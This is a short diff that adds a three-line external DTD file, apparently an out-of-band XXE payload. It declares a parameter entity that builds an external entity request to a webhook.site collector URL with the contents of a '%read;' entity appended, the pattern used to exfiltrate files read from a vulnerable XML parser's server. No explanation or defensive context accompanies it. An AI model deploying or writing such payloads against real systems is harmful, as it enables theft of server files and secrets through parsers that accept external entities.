@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY request SYSTEM 'https://webhook.site/be4883b3-dd1e-436a-97b6-c212085d82b3?%read;'>">
+%all;
